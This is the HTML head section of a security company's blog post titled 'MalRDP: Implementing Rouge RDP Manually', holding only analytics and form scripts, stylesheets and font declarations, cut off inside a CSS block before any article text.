<html lang="en-US"><head>
<meta charset="UTF-8">
<script src="https://sc.lfeeder.com/lftracker_v1_Xbp1oaEnrEg8EdVj.js" async=""></script><script>
var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),gform.hooks[o][n].push({tag:i,callable:r,priority:t=null==t?10:t})},doHook:function(n,o,r){var t;if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[n][o]&&((o=gform.hooks[n][o]).sort(function(o,n){return o.priority-n.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==n?t.apply(null,r):r[0]=t.apply(null,r)})),"filter"==n)return r[0]},removeHook:function(o,n,t,i){var r;null!=gform.hooks[o][n]&&(r=(r=gform.hooks[o][n]).filter(function(o,n,r){return!!(null!=i&&i!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][n]=r)}});
</script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- WP_HEAD() START -->
<link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Montserrat:100,200,300,400,500,600,700,800,900|Montserrat:100,200,300,400,500,600,700,800,900">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:100,200,300,400,500,600,700,800,900|Montserrat:100,200,300,400,500,600,700,800,900">
<meta name="robots" content="max-image-preview:large">
<title>MalRDP: Implementing Rouge RDP Manually - Shorsec Cyber Security</title>
<link rel="dns-prefetch" href="//static.addtoany.com">
<link rel="alternate" type="application/rss+xml" title="Shorsec Cyber Security » Feed" href="https://shorsec.io/feed/">
<link rel="alternate" type="application/rss+xml" title="Shorsec Cyber Security » Comments Feed" href="https://shorsec.io/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Shorsec Cyber Security » MalRDP: Implementing Rouge RDP Manually Comments Feed" href="https://shorsec.io/blog/malrdp-implementing-rouge-rdp-manually/feed/">
		<!-- This site uses the Google Analytics by MonsterInsights plugin v8.23.1 - Using Analytics tracking - https://www.monsterinsights.com/ -->
							<script src="//www.googletagmanager.com/gtag/js?id=G-BDFSE8QDQX" data-cfasync="false" data-wpfc-render="false" async=""></script>
			<script data-cfasync="false" data-wpfc-render="false">
				var mi_version = '8.23.1';
				var mi_track_user = true;
				var mi_no_track_reason = '';
				
								var disableStrs = [
										'ga-disable-G-BDFSE8QDQX',
									];

				/* Function to detect opted out users */
				function __gtagTrackerIsOptedOut() {
					for (var index = 0; index < disableStrs.length; index++) {
						if (document.cookie.indexOf(disableStrs[index] + '=true') > -1) {
							return true;
						}
					}

					return false;
				}

				/* Disable tracking if the opt-out cookie exists. */
				if (__gtagTrackerIsOptedOut()) {
					for (var index = 0; index < disableStrs.length; index++) {
						window[disableStrs[index]] = true;
					}
				}

				/* Opt-out function */
				function __gtagTrackerOptout() {
					for (var index = 0; index < disableStrs.length; index++) {
						document.cookie = disableStrs[index] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
						window[disableStrs[index]] = true;
					}
				}

				if ('undefined' === typeof gaOptout) {
					function gaOptout() {
						__gtagTrackerOptout();
					}
				}
								window.dataLayer = window.dataLayer || [];

				window.MonsterInsightsDualTracker = {
					helpers: {},
					trackers: {},
				};
				if (mi_track_user) {
					function __gtagDataLayer() {
						dataLayer.push(arguments);
					}

					function __gtagTracker(type, name, parameters) {
						if (!parameters) {
							parameters = {};
						}

						if (parameters.send_to) {
							__gtagDataLayer.apply(null, arguments);
							return;
						}

						if (type === 'event') {
														parameters.send_to = monsterinsights_frontend.v4_id;
							var hookName = name;
							if (typeof parameters['event_category'] !== 'undefined') {
								hookName = parameters['event_category'] + ':' + name;
							}

							if (typeof MonsterInsightsDualTracker.trackers[hookName] !== 'undefined') {
								MonsterInsightsDualTracker.trackers[hookName](parameters);
							} else {
								__gtagDataLayer('event', name, parameters);
							}
							
						} else {
							__gtagDataLayer.apply(null, arguments);
						}
					}

					__gtagTracker('js', new Date());
					__gtagTracker('set', {
						'developer_id.dZGIzZG': true,
											});
										__gtagTracker('config', 'G-BDFSE8QDQX', {"forceSSL":"true","link_attribution":"true"} );
															window.gtag = __gtagTracker;										(function () {
						/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
						/* ga and __gaTracker compatibility shim. */
						var noopfn = function () {
							return null;
						};
						var newtracker = function () {
							return new Tracker();
						};
						var Tracker = function () {
							return null;
						};
						var p = Tracker.prototype;
						p.get = noopfn;
						p.set = noopfn;
						p.send = function () {
							var args = Array.prototype.slice.call(arguments);
							args.unshift('send');
							__gaTracker.apply(null, args);
						};
						var __gaTracker = function () {
							var len = arguments.length;
							if (len === 0) {
								return;
							}
							var f = arguments[len - 1];
							if (typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function') {
								if ('send' === arguments[0]) {
									var hitConverted, hitObject = false, action;
									if ('event' === arguments[1]) {
										if ('undefined' !== typeof arguments[3]) {
											hitObject = {
												'eventAction': arguments[3],
												'eventCategory': arguments[2],
												'eventLabel': arguments[4],
												'value': arguments[5] ? arguments[5] : 1,
											}
										}
									}
									if ('pageview' === arguments[1]) {
										if ('undefined' !== typeof arguments[2]) {
											hitObject = {
												'eventAction': 'page_view',
												'page_path': arguments[2],
											}
										}
									}
									if (typeof arguments[2] === 'object') {
										hitObject = arguments[2];
									}
									if (typeof arguments[5] === 'object') {
										Object.assign(hitObject, arguments[5]);
									}
									if ('undefined' !== typeof arguments[1].hitType) {
										hitObject = arguments[1];
										if ('pageview' === hitObject.hitType) {
											hitObject.eventAction = 'page_view';
										}
									}
									if (hitObject) {
										action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
										hitConverted = mapArgs(hitObject);
										__gtagTracker('event', action, hitConverted);
									}
								}
								return;
							}

							function mapArgs(args) {
								var arg, hit = {};
								var gaMap = {
									'eventCategory': 'event_category',
									'eventAction': 'event_action',
									'eventLabel': 'event_label',
									'eventValue': 'event_value',
									'nonInteraction': 'non_interaction',
									'timingCategory': 'event_category',
									'timingVar': 'name',
									'timingValue': 'value',
									'timingLabel': 'event_label',
									'page': 'page_path',
									'location': 'page_location',
									'title': 'page_title',
									'referrer' : 'page_referrer',
								};
								for (arg in args) {
																		if (!(!args.hasOwnProperty(arg) || !gaMap.hasOwnProperty(arg))) {
										hit[gaMap[arg]] = args[arg];
									} else {
										hit[arg] = args[arg];
									}
								}
								return hit;
							}

							try {
								f.hitCallback();
							} catch (ex) {
							}
						};
						__gaTracker.create = newtracker;
						__gaTracker.getByName = newtracker;
						__gaTracker.getAll = function () {
							return [];
						};
						__gaTracker.remove = noopfn;
						__gaTracker.loaded = true;
						window['__gaTracker'] = __gaTracker;
					})();
									} else {
										console.log("");
					(function () {
						function __gtagTracker() {
							return null;
						}

						window['__gtagTracker'] = __gtagTracker;
						window['gtag'] = __gtagTracker;
					})();
									}
			</script>
				<!-- / Google Analytics by MonsterInsights -->
		<link rel="stylesheet" id="elegant-custom-fonts-css" href="//shorsec.io/wp-content/uploads/elegant-custom-fonts/ecf.css?ver=9dcc091ed89f7eabda6567dca696ca6c" media="all">
<style id="wp-block-library-inline-css">
:root{--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,161;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px;--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{clip:rect(1px,1px,1px,1px);word-wrap:normal!important;border:0;-webkit-clip-path:inset(50%);clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{clip:auto!important;background-color:#ddd;-webkit-clip-path:none;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
</style>
<style id="classic-theme-styles-inline-css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--base: #ffffff;--wp--preset--color--contrast: #000000;--wp--preset--color--primary: #9DFF20;--wp--preset--color--secondary: #345C00;--wp--preset--color--tertiary: #F6F6F6;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: clamp(0.875rem, 0.875rem + ((1vw - 0.2rem) * 0.227), 1rem);--wp--preset--font-size--medium: clamp(1rem, 1rem + ((1vw - 0.2rem) * 0.227), 1.125rem);--wp--preset--font-size--large: clamp(1.75rem, 1.75rem + ((1vw - 0.2rem) * 0.227), 1.875rem);--wp--preset--font-size--x-large: 2.25rem;--wp--preset--font-size--xx-large: clamp(4rem, 4rem + ((1vw - 0.2rem) * 10.909), 10rem);--wp--preset--font-family--dm-sans: "DM Sans", sans-serif;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--inter: "Inter", sans-serif;--wp--preset--font-family--system-font: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;--wp--preset--font-family--source-serif-pro: "Source Serif Pro", serif;--wp--preset--spacing--30: clamp(1.5rem, 5vw, 2rem);--wp--preset--spacing--40: clamp(1.8rem, 1.8rem + ((1vw - 0.48rem) * 2.885), 3rem);--wp--preset--spacing--50: clamp(2.5rem, 8vw, 4.5rem);--wp--preset--spacing--60: clamp(3.75rem, 10vw, 7rem);--wp--preset--spacing--70: clamp(5rem, 5.25rem + ((1vw - 0.48rem) * 9.096), 8rem);--wp--preset--spacing--80: clamp(7rem, 14vw, 11rem);--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(body .is-layout-flow)  > :first-child:first-child{margin-block-start: 0;}:where(body .is-layout-flow)  > :last-child:last-child{margin-block-end: 0;}:where(body .is-layout-flow)  > *{margin-block-start: 1.5rem;margin-block-end: 0;}:where(body .is-layout-constrained)  > :first-child:first-child{margin-block-start: 0;}:where(body .is-layout-constrained)  > :last-child:last-child{margin-block-end: 0;}:where(body .is-layout-constrained)  > *{margin-block-start: 1.5rem;margin-block-end: 0;}:where(body .is-layout-flex) {gap: 1.5rem;}:where(body .is-layout-grid) {gap: 1.5rem;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel="stylesheet" id="oxygen-css" href="https://shorsec.io/wp-content/plugins/oxygen/component-framework/oxygen.css?ver=4.5" media="all">
<link rel="stylesheet" id="addtoany-css" href="https://shorsec.io/wp-content/plugins/add-to-any/addtoany.min.css?ver=1.16" media="all">
<script src="https://shorsec.io/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=8.23.1" id="monsterinsights-frontend-script-js"></script>
<script data-cfasync="false" data-wpfc-render="false" id="monsterinsights-frontend-script-js-extra">var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/shorsec.io","hash_tracking":"false","v4_id":"G-BDFSE8QDQX"};</script>
<script id="addtoany-core-js-before">
window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};
</script>
<script async="" src="https://static.addtoany.com/menu/page.js" id="addtoany-core-js"></script>
<script src="https://shorsec.io/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script><script src="https://static.addtoany.com/menu/modules/core.BRQnzO8v.js" type="module"></script>
<script async="" src="https://shorsec.io/wp-content/plugins/add-to-any/addtoany.min.js?ver=1.1" id="addtoany-jquery-js"></script>
<link rel="https://api.w.org/" href="https://shorsec.io/wp-json/"><link rel="alternate" type="application/json" href="https://shorsec.io/wp-json/wp/v2/posts/435"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://shorsec.io/xmlrpc.php?rsd">

<link rel="canonical" href="https://shorsec.io/blog/malrdp-implementing-rouge-rdp-manually/">
<link rel="shortlink" href="https://shorsec.io/?p=435">
<link rel="alternate" type="application/json+oembed" href="https://shorsec.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fshorsec.io%2Fblog%2Fmalrdp-implementing-rouge-rdp-manually%2F">
<link rel="alternate" type="text/xml+oembed" href="https://shorsec.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fshorsec.io%2Fblog%2Fmalrdp-implementing-rouge-rdp-manually%2F&amp;format=xml">
<!-- start Simple Custom CSS and JS -->
<style>
.logo-carousel-slide {
  	width: calc(100% / 7 - 20px);
	height: auto;
	margin-right: 30px;
	min-height: 100%;
	justify-content: center;
	align-items: center !important;
}

@media (max-width: 992px) {
	.logo-carousel-slide {
  		width: calc(100% / 4 - 20px);
		margin-right: 20px;
	}
}

@media (max-width: 480px) {
	.logo-carousel-slide {
  		width: calc(100% / 3 - 20px);
		margin-right: 20px;
	}
}</style>
<!-- end Simple Custom CSS and JS -->
<!-- start Simple Custom CSS and JS -->
<link rel="stylesheet" href="https://unpkg.com/flickity@2/dist/flickity.min.css">
<script src="https://unpkg.com/flickity@2/dist/flickity.pkgd.min.js"></script><!-- end Simple Custom CSS and JS -->
<script> (function(ss,ex){ window.ldfdr=window.ldfdr||function(){(ldfdr._q=ldfdr._q||[]).push([].slice.call(arguments));}; (function(d,s){ fs=d.getElementsByTagName(s)[0]; function ce(src){ var cs=d.createElement(s); cs.src=src; cs.async=1; fs.parentNode.insertBefore(cs,fs); }; ce('https://sc.lfeeder.com/lftracker_v1_'+ss+(ex?'_'+ex:'')+'.js'); })(document,'script'); })('Xbp1oaEnrEg8EdVj'); </script><style id="wp-fonts-local">
@font-face{font-family:"DM Sans";font-style:normal;font-weight:400;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/dm-sans/DMSans-Regular.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"DM Sans";font-style:italic;font-weight:400;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/dm-sans/DMSans-Regular-Italic.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"DM Sans";font-style:normal;font-weight:700;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/dm-sans/DMSans-Bold.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"DM Sans";font-style:italic;font-weight:700;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/dm-sans/DMSans-Bold-Italic.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"IBM Plex Mono";font-style:normal;font-weight:300;font-display:block;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/ibm-plex-mono/IBMPlexMono-Light.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"IBM Plex Mono";font-style:normal;font-weight:400;font-display:block;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/ibm-plex-mono/IBMPlexMono-Regular.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"IBM Plex Mono";font-style:italic;font-weight:400;font-display:block;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/ibm-plex-mono/IBMPlexMono-Italic.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"IBM Plex Mono";font-style:normal;font-weight:700;font-display:block;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/ibm-plex-mono/IBMPlexMono-Bold.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:Inter;font-style:normal;font-weight:200 900;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/inter/Inter-VariableFont_slnt,wght.ttf') format('truetype');font-stretch:normal;}
@font-face{font-family:"Source Serif Pro";font-style:normal;font-weight:200 900;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.ttf.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:"Source Serif Pro";font-style:italic;font-weight:200 900;font-display:fallback;src:url('https://shorsec.io/wp-content/themes/oxygen-is-not-a-theme/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.ttf.woff2') format('woff2');font-stretch:normal;}
</style>
<link rel="icon" href="https://shorsec.io/wp-content/uploads/2023/07/favicon.png" sizes="32x32">
<link rel="icon" href="https://shorsec.io/wp-content/uploads/2023/07/favicon.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://shorsec.io/wp-content/uploads/2023/07/favicon.png">
<meta name="msapplication-TileImage" content="https://shorsec.io/wp-content/uploads/2023/07/favicon.png">
<link rel="stylesheet" id="oxygen-cache-38-css" href="//shorsec.io/wp-content/uploads/oxygen/css/38.css?cache=1694624129&amp;ver=9dcc091ed89f7eabda6567dca696ca6c" media="all">
<link rel="stylesheet" id="oxygen-cache-115-css" href="//shorsec.io/wp-content/uploads/oxygen/css/115.css?cache=1690117876&amp;ver=9dcc091ed89f7eabda6567dca696ca6c" media="all">
<link rel="stylesheet" id="oxygen-universal-styles-css" href="//shorsec.io/wp-content/uploads/oxygen/css/universal.css?cache=1705571337&amp;ver=9dcc091ed89f7eabda6567dca696ca6c" media="all">
<!-- END OF WP_HEAD() -->
<style type="text/css">.a2a_hide{display:none}.a2a_logo_color{background-color:#0166ff}.a2a_menu,.a2a_menu *{-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box;float:none;margin:0;padding:0;position:static;height:auto;width:auto}.a2a_menu{border-radius:6px;display:none;direction:ltr;background:#FFF;font:16px sans-serif-light,HelveticaNeue-Light,"Helvetica Neue Light","Helvetica Neue",Arial,Helvetica,"Liberation Sans",sans-serif;color:#000;line-height:12px;border:1px solid #CCC;vertical-align:baseline;overflow:hidden}.a2a_mini{min-width:200px;position:absolute;width:300px;z-index:9999997}.a2a_overlay{display:none;background:#616c7deb;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);position:fixed;top:0;right:0;left:0;bottom:0;z-index:9999998;-webkit-tap-highlight-color:transparent;transition:opacity .14s,backdrop-filter .14s}.a2a_full{background:#FFF;border:1px solid #FFF;box-shadow:#2a2a2a1a 0 0 20px 